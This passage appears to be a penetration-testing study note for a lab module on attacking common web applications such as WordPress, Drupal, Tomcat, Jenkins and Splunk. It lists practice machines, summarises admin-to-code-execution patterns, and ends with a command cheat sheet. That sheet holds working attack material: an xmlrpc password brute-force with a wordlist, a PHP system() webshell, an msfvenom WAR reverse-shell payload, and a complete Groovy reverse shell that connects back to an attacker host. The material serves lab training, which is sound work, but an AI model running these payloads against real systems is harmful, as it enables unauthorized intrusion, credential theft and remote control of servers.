- **WordPress:** [HTB: MetaTwo](https://app.hackthebox.com/machines/MetaTwo) (WordPress plugin SQLi + XXE for creds), [HTB: Blog](https://app.hackthebox.com/machines/Blog) (WordPress XML-RPC + privilege escalation)
- **Tomcat:** [HTB: Tabby](https://app.hackthebox.com/machines/Tabby) (Tomcat manager WAR deploy), [HTB: Jerry](https://app.hackthebox.com/machines/Jerry) (default Tomcat creds + WAR RCE)
- **Jenkins:** [HTB: Jeeves](https://app.hackthebox.com/machines/Jeeves) (Jenkins Groovy console → NTLM hash in KeePass)
- **GitLab:** Any box with GitLab that has authenticated CVEs (search ippsec.rocks for "gitlab")
- **Shellshock:** [HTB: Shocker](https://app.hackthebox.com/machines/Shocker) (Shellshock + CGI, the classic box for this technique)
- **Thick Client / dnSpy:** [HTB: Multimaster](https://app.hackthebox.com/machines/Multimaster) (the same MultimasterAPI.dll from Skills Assessment III appears here)
- **ColdFusion:** [HTB: Arctic](https://app.hackthebox.com/machines/Arctic) (ColdFusion 8 unauthenticated file upload → RCE)
- **WebLogic:** [HTB: Stratosphere](https://app.hackthebox.com/machines/Stratosphere) (for adjacent Java app exploitation concepts)

---

## Module Summary

**Fingerprinting pattern (same for every app):** README/CHANGELOG/error page → version → `searchsploit <name> <version>` or MSF module search. Default creds before touching exploits.

**WordPress:** `wpscan --enumerate` for users/plugins; `--password-attack xmlrpc` to brute; `/wp-content/uploads/` for directory listing; plugin LFI via vulnerable PHP includes; theme editor or plugin-zip for admin-to-RCE.

**Joomla:** README.txt for version; joomla-brute.py; template editor (same pattern as WordPress theme editor).

**Drupal:** CHANGELOG.txt for version; PHP Filter module = instant admin-to-RCE on old versions.

**Tomcat:** MSF `tomcat_mgr_login` for creds; WAR deploy for RCE; Windows + old Tomcat = CVE-2019-0232 via CGI `.bat` file + URL-encoded cmdline injection.

**Jenkins:** Script Console + Groovy = instant root shell.

**Splunk:** App-install tar.gz = immediate code execution.

**PRTG:** Notification "Execute Program" = net user creation → CrackMapExec verify → Evil-WinRM.

**Shellshock:** Any CGI that invokes bash = User-Agent header injection.

**IIS Tilde:** iis_shortname_scanner.jar reveals 8.3 prefixes → egrep wordlist → gobuster for full names.

**LDAP auth bypass:** `*` wildcard in username and password bypasses unsanitized LDAP queries.

**gdb ODBC:** Break at `SQLDriverConnect` → read connection string from RDX register.

**Skills Assessment II pattern:** vHost fuzz → GitLab public repo for hardcoded creds → Nagios RCE.


---

## HTB Module Quick Reference

Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.

```bash
# ============================================================
# DISCOVERY
# ============================================================
# Nmap web ports on all targets in scope
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA nmap/${BoxName}_web $BoxIP

# Screenshot all discovered web services
eyewitness --web -x nmap/${BoxName}_web.xml -d loot/eyewitness/
cat nmap/${BoxName}_web.xml | ./aquatone -nmap   # alternative

# ============================================================
# WORDPRESS
# ============================================================
# Full WPScan enumeration (plugins, themes, users, timthumbs)
sudo wpscan --url http://$BoxName --enumerate -o loot/wpscan.txt

# Password attack via xmlrpc (faster than wp-login brute)
sudo wpscan --password-attack xmlrpc -t 20 \
  -U $Username \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://$BoxName

# Execute webshell once planted (via theme/plugin RCE)
curl -s "http://$BoxName/wp-content/plugins/plugin/shell.php?cmd=id"

# ============================================================
# JOOMLA
# ============================================================
droopescan scan joomla --url http://$BoxIP   # version + vuln enum
# Admin panel → Extensions → Templates → edit PHP in a template → add shell code
curl -s "http://$BoxIP/templates/beez3/shell.php?cmd=id"

# ============================================================
# DRUPAL
# ============================================================
# PHP filter webshell (Modules → PHP filter → enable → new basic page)
# Webshell content:
echo '<?php system($_GET["dcfdd5e021a869fcc6dfaef8bf31377e"]); ?>' > webshell_drupal.txt
curl -s "http://$BoxIP/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid | cut -f4 -d">"

# ============================================================
# APACHE TOMCAT
# ============================================================
# Version and AJP check
nmap -sV -p 8009,8080 $BoxIP

# WAR reverse shell payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f war -o www/backup.war

# Upload via Tomcat Manager (/manager/html) then trigger:
curl "http://$BoxIP:8080/backup/"

# MSF manager login brute (tomcat default creds wordlist)
# use auxiliary/scanner/http/tomcat_mgr_login

# ============================================================
# JENKINS
# ============================================================
# Groovy reverse shell via Script Console (Manage Jenkins → Script Console)
# Linux:
String host="$LocalIP"; int port=$Port; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

# ============================================================
# SPLUNK
# ============================================================
# https://github.com/0xjpuff/reverse_shell_splunk
# Upload as a Splunk app (tar.gz format), triggers on install

# ============================================================
# GOBUSTER (directory enum for any app)
# ============================================================
gobuster dir -u http://$BoxIP -w $Wordlist -o loot/gobuster.txt
```
